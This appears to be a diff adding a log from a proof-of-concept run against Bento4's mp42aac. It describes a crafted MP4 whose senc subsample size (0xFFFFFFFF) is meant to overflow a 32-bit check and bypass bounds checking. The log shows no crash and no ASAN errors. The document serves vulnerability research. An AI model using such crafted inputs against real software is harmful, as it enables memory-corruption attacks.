@@ -1,0 +1,31 @@
+=== VULN-002 PoC Run: Mon Sep  7 05:51:53 AM +08 2026 ===
+
+[*] Generating vuln_002.mp4...
+[+] Written 761 bytes to /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4CommonEncryption_cpp/vuln_002.mp4
+[+] MP4 structure: ftyp(28) + moov(609) + moof(112) + mdat(12)
+[+] senc subsample: cleartext=1, encrypted=0xFFFFFFFF
+[+] Overflow: 1 + 0xFFFFFFFF = 0x100000000 -> truncates to 0 (32-bit)
+[+] Bounds check bypassed: any_positive < 0 is always false
+
+[*] Binary: /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac
+[*] Input:  /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4CommonEncryption_cpp/vuln_002.mp4
+[*] File size: 761 bytes
+
+--- Run 1: without --key (parsing only) ---
+ERROR: encrypted tracks require a key
+Audio Track:
+  duration: 0 ms
+  sample count: 0
+[exit code: 0]
+
+--- Run 2: with --key 00000000000000000000000000000000 ---
+ERROR: unable to create decrypter
+Audio Track:
+  duration: 0 ms
+  sample count: 0
+[exit code: 0]
+
+--- ASAN Log Analysis ---
+[*] No ASAN errors detected in log files
+
+=== Run complete ===
